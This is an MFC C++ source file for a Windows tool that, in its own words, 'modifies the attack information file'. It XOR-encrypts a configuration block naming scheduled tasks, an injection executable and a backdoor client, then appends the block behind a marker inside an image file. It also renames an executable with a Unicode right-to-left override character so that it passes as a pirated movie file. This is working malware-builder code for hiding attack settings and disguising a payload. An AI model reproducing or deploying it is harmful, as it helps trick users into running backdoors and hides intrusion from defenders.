
// modidatDlg.cpp : implementation file
//

#include "stdafx.h"
#include "modidat.h"
#include "modidatDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
#define BUFLEN 4096
#include <io.h>

// CmodidatDlg dialog



CmodidatDlg::CmodidatDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_modidat_DIALOG, pParent)
	, TaskName(_T(""))
	, Comment(_T(""))
	, ApplicationName(_T(""))
	, S_YY(0)
	, S_MM(0)
	, S_DD(0)
	, S_hh(0)
	, S_mm(0)
	, S_ss(0)
	, E_YY(0)
	, E_MM(0)
	, E_DD(0)
	, E_hh(0)
	, E_mm(0)
	, E_ss(0)
	, VIEW(_T(""))
	, Key(_T(""))
	, Image(_T(""))
	, NewImage(_T(""))
	, InjectFile(_T(""))
	, BackDoorFile(_T(""))
	, AttackImage(_T(""))
	, S_Inject(0)
	, E_Inject(0)
	, S_BackDoor(0)
	, E_BackDoor(0)
	, S_KeyCode(0)
	, E_KeyCode(0)
	, MediaName(_T(""))
	, MediaFile(_T(""))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CmodidatDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_TaskName, TaskName);
	DDV_MaxChars(pDX, TaskName, 63);
	DDX_Text(pDX, IDC_EDIT_Comment, Comment);
	DDV_MaxChars(pDX, Comment, 127);
	DDX_Text(pDX, IDC_EDIT_ApplicationName, ApplicationName);
	DDV_MaxChars(pDX, ApplicationName, 255);
	DDX_Text(pDX, IDC_EDIT_S_YY, S_YY);
	DDV_MinMaxInt(pDX, S_YY, 1999, 2999);
	DDX_Text(pDX, IDC_EDIT_S_MM, S_MM);
	DDV_MinMaxInt(pDX, S_MM, 1, 12);
	DDX_Text(pDX, IDC_EDIT_S_DD, S_DD);
	DDV_MinMaxInt(pDX, S_DD, 1, 31);
	DDX_Text(pDX, IDC_EDIT_S_HH, S_hh);
	DDV_MinMaxInt(pDX, S_hh, 0, 23);
	DDX_Text(pDX, IDC_EDIT_S_MM2, S_mm);
	DDV_MinMaxInt(pDX, S_mm, 0, 59);
	DDX_Text(pDX, IDC_EDIT_S_ss, S_ss);
	DDV_MinMaxInt(pDX, S_ss, 0, 59);
	DDX_Text(pDX, IDC_EDIT_E_YY, E_YY);
	DDV_MinMaxInt(pDX, E_YY, 1999, 2999);
	DDX_Text(pDX, IDC_EDIT_E_MM, E_MM);
	DDV_MinMaxInt(pDX, E_MM, 1, 12);
	DDX_Text(pDX, IDC_EDIT_E_DD, E_DD);
	DDV_MinMaxInt(pDX, E_DD, 1, 31);
	DDX_Text(pDX, IDC_EDIT_E_hh, E_hh);
	DDV_MinMaxInt(pDX, E_hh, 0, 23);
	DDX_Text(pDX, IDC_EDIT_E_mm2, E_mm);
	DDV_MinMaxInt(pDX, E_mm, 00, 59);
	DDX_Text(pDX, IDC_EDIT_E_ss, E_ss);
	DDV_MinMaxInt(pDX, E_ss, 0, 59);
	DDX_Text(pDX, IDC_EDIT_VIEW, VIEW);
	DDX_Text(pDX, IDC_MFCEDITBROWSE1, Key);
	DDX_Text(pDX, IDC_MFCEDITBROWSE2, Image);
	DDX_Text(pDX, IDC_EDIT_NewImage, NewImage);
	DDV_MaxChars(pDX, NewImage, 127);
	DDX_Text(pDX, IDC_EDIT_InjectFile, InjectFile);
	DDV_MaxChars(pDX, InjectFile, 63);
	DDX_Text(pDX, IDC_EDIT_BackDoorFile, BackDoorFile);
	DDV_MaxChars(pDX, BackDoorFile, 63);
	DDX_Text(pDX, IDC_EDIT_AttackImage, AttackImage);
	DDV_MaxChars(pDX, AttackImage, 127);
	DDX_Text(pDX, IDC_EDIT_S_Inject, S_Inject);
	DDV_MinMaxInt(pDX, S_Inject, 0, 2000000000);
	DDX_Text(pDX, IDC_EDIT_E_Inject, E_Inject);
	DDV_MinMaxInt(pDX, E_Inject, 0, 2000000000);
	DDX_Text(pDX, IDC_EDIT_S_BackDoor, S_BackDoor);
	DDV_MinMaxInt(pDX, S_BackDoor, 0, 2000000000);
	DDX_Text(pDX, IDC_EDIT_E_BackDoor, E_BackDoor);
	DDV_MinMaxInt(pDX, E_BackDoor, 0, 2000000000);
	DDX_Text(pDX, IDC_EDIT_S_KeyCode, S_KeyCode);
	DDV_MinMaxInt(pDX, S_KeyCode, 0, 2000000000);
	DDX_Text(pDX, IDC_EDIT_KeyCode, E_KeyCode);
	DDV_MinMaxInt(pDX, E_KeyCode, 0, 2000000000);
	DDX_Text(pDX, IDC_EDIT_VideoName, MediaName);
	DDX_Text(pDX, IDC_MFCEDITBROWSE_MediaFile, MediaFile);
}

BEGIN_MESSAGE_MAP(CmodidatDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDCANCEL, &CmodidatDlg::OnBnClickedCancel)
	ON_EN_CHANGE(IDC_EDIT_TaskName, &CmodidatDlg::OnEnChangeEditTaskname)
	ON_BN_CLICKED(IDC_BUTTON_SET, &CmodidatDlg::OnBnClickedButtonSet)
	ON_BN_CLICKED(IDC_BUTTON_CLEAR, &CmodidatDlg::OnBnClickedButtonClear)
	//ON_EN_CHANGE(IDC_EDIT7, &CmodidatDlg::OnEnChangeEdit7)
END_MESSAGE_MAP()


// CmodidatDlg message handlers

BOOL CmodidatDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	// TODO: Add extra initialization here
	CMFCEditBrowseCtrl *key_ctrl;
	key_ctrl = (CMFCEditBrowseCtrl *)GetDlgItem(IDC_MFCEDITBROWSE1);
	key_ctrl->EnableFileBrowseButton(NULL, _T("Key files|key||"));

	CMFCEditBrowseCtrl *image_ctrl;
	image_ctrl = (CMFCEditBrowseCtrl *)GetDlgItem(IDC_MFCEDITBROWSE2);
	image_ctrl->EnableFileBrowseButton(NULL, _T("Image files|*.png;*.jpg;*.jpeg;*.gif;*.bmp||"));

	CMFCEditBrowseCtrl *media_ctrl;
	media_ctrl = (CMFCEditBrowseCtrl *)GetDlgItem(IDC_MFCEDITBROWSE_MediaFile);
	media_ctrl->EnableFileBrowseButton(NULL, _T("Media files|*.exe||"));

	VIEW.SetString(_T("This program modifies the attack information file.\r\n\r\n"));
	NewImage.SetString(_T("EX) myhack_data.jpg"));
	TaskName.SetString(_T("EX) Scheduled Task"));
	Comment.SetString(_T("EX) Comment"));
	ApplicationName.SetString(_T("EX) Injection.exe conhost Backdoor.exe"));
	S_YY = 1999; S_MM = 11; S_DD = 30; S_hh = 8; S_mm = 0; S_ss = 0;
	E_YY = 2000; E_MM = 12; E_DD = 12; E_hh = 23; E_mm = 59; E_ss = 59;
	InjectFile.SetString(_T("EX) injection.exe"));
	BackDoorFile.SetString(_T("EX) client.exe"));
	AttackImage.SetString(_T("EX) myhack.jpg"));
	S_Inject = 1; E_Inject = 99; S_BackDoor = 100; E_BackDoor = 199; S_KeyCode = 200; E_KeyCode = 299;
	MediaName.SetString(_T("EX) American.Sniper.2014.1080p.BRRip.x264-YIFY"));

	UpdateData(FALSE);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CmodidatDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CmodidatDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CmodidatDlg::OnBnClickedCancel()
{
	// TODO: Add your control notification handler code here
	CDialogEx::OnCancel();
}


void CmodidatDlg::OnEnChangeEditTaskname()
{
	// TODO:  If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialogEx::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO:  Add your control notification handler code here
}

int File_Open(FILE **pImage, FILE **pNewImage, FILE **pKeys ,CString Image, CString NewImage, CString Key) {
	// File Open
	int err;
	char strImage[1024], strNewImage[1024], strKey[1024];
	memset(strImage, '\0', 1024);
	memset(strNewImage, '\0', 1024);
	memset(strKey, '\0', 1024);
	WideCharToMultiByte(CP_ACP, NULL, Image, -1, strImage, 1024, NULL, NULL);
	WideCharToMultiByte(CP_ACP, NULL, NewImage, -1, strNewImage, 1024, NULL, NULL);
	WideCharToMultiByte(CP_ACP, NULL, Key, -1, strKey, 1024, NULL, NULL);
	
	// Image file open
	err = fopen_s(pImage, strImage, "r+b");//r+는 fseek가능
	if (err != 0) return 1;

	// verify that the picture was modified
	char buf[BUFLEN];
	int num;
	memset(buf, 0, BUFLEN);
	while ((num = fread(buf, sizeof(char), BUFLEN, *pImage)) > 0) {
		char *p;
		for (p = buf; p <= (buf - 16 + BUFLEN); p++)
			if (memcmp(p, "\xB5\xA5\xC0\xCC\xC5\xCD\xBE\xCF\xC8\xA3\xC8\xAD\xBD\xC3\xC0\xDB", 16) == 0)
				return 2;
		memset(buf, 0, sizeof(buf));
	}
	_fseeki64(*pImage, 0, SEEK_SET);

	// NewImage file open
	err = _access(strNewImage, 0);
	if (err == 0) return 3;
	err = fopen_s(pNewImage, strNewImage, "wb");//r+는 fseek가능
	if (err != 0) return 3;

	// key file open
	err = fopen_s(pKeys, strKey, "r+b");//r+는 fseek가능
	if (err != 0) return 4;

	return 0;
}

void AppendText(CEdit &VIEW, wchar_t* pszText) {
	int Length = VIEW.GetWindowTextLengthW();
	VIEW.SetSel(Length, Length);
	VIEW.ReplaceSel(pszText);
	VIEW.SetFocus();
}

char* merge(char *finger, char *string, int size) {
	strcat_s(finger, size, string);
	finger += size;
	return finger;
}

void BOM_remove(char *string, int size) {
	int i;
	for (i = 0; i < size; i++)
		if (string[i] == '\xFE') string[i] = '\x00';
}

void Encrypt(char *plain, char *key, int size) {
	int i;
	for (i = 0; i < size; i++){
		*plain = (*plain ^ *key);
		plain++;
		key++;
	}
}

void CmodidatDlg::OnBnClickedButtonSet()
{
	// TODO: Add your control notification handler code here
	CEdit *pVIEW;
	pVIEW = (CEdit *)GetDlgItem(IDC_EDIT_VIEW);
	
	// Setting Data
	UpdateData(TRUE);
	pVIEW->SetWindowTextW(_T("This program modifies the attack information file.\r\n\r\n"));
	int err;
	wchar_t tmp[1024];
	// File Open
	FILE *pImage = NULL, *pNewImage = NULL, *pKeys = NULL;
	err = File_Open(&pImage, &pNewImage, &pKeys, Image, NewImage, Key);

	if (err == 0) {
		wsprintf(tmp, L"%s file open succss!\r\n", Image);
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));

		wsprintf(tmp, L"%s file open succss!\r\n\r\n", Key);
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));

		// Encrypt Data
		char buf[BUFLEN];
		int num;
		memset(buf, 0, BUFLEN);

		// read key file
		char keyString[BUFLEN];
		memset(keyString, 0, BUFLEN);
		while ((num = fread(buf, sizeof(char), BUFLEN, pKeys)) > 0) {
			memcpy_s(keyString, BUFLEN, buf, num);
			memset(buf, 0, sizeof(buf));
		}

		// copy and paste image file
		while ((num = fread(buf, sizeof(char), BUFLEN, pImage)) > 0) {
			fwrite(buf, sizeof(char), num, pNewImage);
			memset(buf, 0, sizeof(buf));
		}

		// int
		char strNewImage[128], strTaskName[64], strComment[128], strApplicationName[256], strInjectFile[64],\
			strBackDoorFile[64], strAttackImage[128];
		memset(strNewImage, '\0', 128); memset(strTaskName, '\0', 64); memset(strComment, '\0', 128);
		memset(strApplicationName, '\0', 256); memset(strInjectFile, '\0', 64); memset(strBackDoorFile, '\0', 64);
		memset(strAttackImage, '\0', 128);
		WideCharToMultiByte(CP_ACP, NULL, NewImage, -1, strNewImage, 128, NULL, NULL);
		WideCharToMultiByte(CP_ACP, NULL, TaskName, -1, strTaskName, 64, NULL, NULL);
		WideCharToMultiByte(CP_ACP, NULL, Comment, -1, strComment, 128, NULL, NULL);
		WideCharToMultiByte(CP_ACP, NULL, ApplicationName, -1, strApplicationName, 256, NULL, NULL);
		WideCharToMultiByte(CP_ACP, NULL, InjectFile, -1, strInjectFile, 64, NULL, NULL);
		WideCharToMultiByte(CP_ACP, NULL, BackDoorFile, -1, strBackDoorFile, 64, NULL, NULL);
		WideCharToMultiByte(CP_ACP, NULL, AttackImage, -1, strAttackImage, 128, NULL, NULL);

		// merge
		wsprintf(tmp, L"Merging data...\r\n");
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));
		const int nSize = sizeof(strNewImage) + sizeof(strTaskName) + sizeof(strComment) \
			+ sizeof(strApplicationName) + (12 * sizeof(int)) + sizeof(strInjectFile) + sizeof(strBackDoorFile) \
			+ sizeof(strAttackImage) +(6 * sizeof(int));
		char Block[nSize];
		memset(Block, '\0', nSize);
		char *finger = NULL; finger = Block;
		strcpy_s(finger, sizeof(strNewImage), strNewImage); finger += sizeof(strNewImage);
		finger = merge(finger, strTaskName, sizeof(strTaskName)); finger = merge(finger, strComment, sizeof(strComment));
		finger = merge(finger, strApplicationName, sizeof(strApplicationName));
		finger = merge(finger, (char *)&S_YY, sizeof(int)); finger = merge(finger, (char *)&S_MM, sizeof(int));
		finger = merge(finger, (char *)&S_DD, sizeof(int)); finger = merge(finger, (char *)&S_hh, sizeof(int));
		finger = merge(finger, (char *)&S_mm, sizeof(int)); finger = merge(finger, (char *)&S_ss, sizeof(int));
		finger = merge(finger, (char *)&E_YY, sizeof(int)); finger = merge(finger, (char *)&E_MM, sizeof(int));
		finger = merge(finger, (char *)&E_DD, sizeof(int)); finger = merge(finger, (char *)&E_hh, sizeof(int));
		finger = merge(finger, (char *)&E_mm, sizeof(int)); finger = merge(finger, (char *)&E_ss, sizeof(int));
		finger = merge(finger, strInjectFile, sizeof(strInjectFile)); finger = merge(finger, strBackDoorFile, sizeof(strBackDoorFile));
		finger = merge(finger, strAttackImage, sizeof(strAttackImage));
		finger = merge(finger, (char *)&S_Inject, sizeof(int)); finger = merge(finger, (char *)&E_Inject, sizeof(int));
		finger = merge(finger, (char *)&S_BackDoor, sizeof(int)); finger = merge(finger, (char *)&E_BackDoor, sizeof(int));
		finger = merge(finger, (char *)&S_KeyCode, sizeof(int)); finger = merge(finger, (char *)&E_KeyCode, sizeof(int));
		BOM_remove(Block, nSize);
		wsprintf(tmp, L"Success!\r\n\r\n");
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));

		// encrypt
		wsprintf(tmp, L"Encrypting data...\r\n");
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));
		Encrypt(Block, keyString, nSize);
		wsprintf(tmp, L"Success!\r\n\r\n");
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));

		// write
		wsprintf(tmp, L"Writing data...\r\n");
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));
		fwrite("\xB5\xA5\xC0\xCC\xC5\xCD\xBE\xCF\xC8\xA3\xC8\xAD\xBD\xC3\xC0\xDB", sizeof(char), 16, pNewImage);
		fwrite(Block, sizeof(char), nSize, pNewImage);
		wsprintf(tmp, L"Success!\r\n\r\n");
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));

		fclose(pImage);
		fclose(pNewImage);
		fclose(pKeys);

		wsprintf(tmp, L"Successfully modified attack information! - %s\r\n\r\n", NewImage);
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));
		
		MediaName += _T("\u202E4pm.exe");
		err = _wrename(MediaFile, MediaName);

		if (err == 0) {
			wsprintf(tmp, L"Successfully rename Media file!");
			AppendText(*pVIEW, tmp);
			ZeroMemory(&tmp, sizeof(char));
		}
		else if (err != 0) {
			wsprintf(tmp, L"Failed rename Media file...");
			AppendText(*pVIEW, tmp);
			ZeroMemory(&tmp, sizeof(char));
		}

	}

	else if (err == 1) {
		wsprintf(tmp, L"%s file open fail!\r\n\r\n", Image);
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));

		wsprintf(tmp, L"Please enter the data again.\r\n\r\n");
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));
	}
	else if (err == 2) {
		wsprintf(tmp, L"%s file has already been modified!\r\n\r\n", Image);
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));

		wsprintf(tmp, L"Please enter a different Image.\r\n");
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));
		fclose(pImage);
	}
	else if (err == 3) {
		wsprintf(tmp, L"%s file open succss!\r\n\r\n", Image);
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));

		wsprintf(tmp, L"%s file open fail!\r\n\r\n", NewImage);
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));

		wsprintf(tmp, L"Please enter a different file name.\r\n");
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));
		fclose(pImage);
	}
	else if (err == 4) {
		wsprintf(tmp, L"%s file open succss!\r\n\r\n", Image);
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));

		wsprintf(tmp, L"%s file open succss!\r\n\r\n", NewImage);
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));

		wsprintf(tmp, L"%s file open fail!\r\n\r\n", Key);
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));

		wsprintf(tmp, L"Please enter the data again.\r\n");
		AppendText(*pVIEW, tmp);
		ZeroMemory(&tmp, sizeof(char));
		fclose(pImage);
		fclose(pNewImage);
	}
}

void CmodidatDlg::OnBnClickedButtonClear()
{
	// TODO: Add your control notification handler code here

	// Clear
	Image.SetString(_T(""));
	NewImage.SetString(_T("EX) myhack_data.jpg"));
	Key.SetString(_T(""));
	VIEW.SetString(_T("This program modifies the attack information file.\r\n\r\n"));
	TaskName.SetString(_T("EX) Scheduled Task"));
	Comment.SetString(_T("EX) Comment"));
	ApplicationName.SetString(_T("EX) Injection.exe conhost Backdoor.exe"));
	S_YY = 1999; S_MM = 11; S_DD = 30; S_hh = 8; S_mm = 0; S_ss = 0;
	E_YY = 2000; E_MM = 12; E_DD = 12; E_hh = 23; E_mm = 59; E_ss = 59;
	InjectFile.SetString(_T("EX) injection.exe"));
	BackDoorFile.SetString(_T("EX) client.exe"));
	AttackImage.SetString(_T("EX) myhack.jpg"));
	S_Inject = 1; E_Inject = 99; S_BackDoor = 100; E_BackDoor = 199; S_KeyCode = 200; E_KeyCode = 299;
	MediaName.SetString(_T("EX) American.Sniper.2014.1080p.BRRip.x264-YIFY"));
	UpdateData(FALSE);
}


void CmodidatDlg::OnEnChangeEdit7()
{
	// TODO:  If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialogEx::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO:  Add your control notification handler code here
}
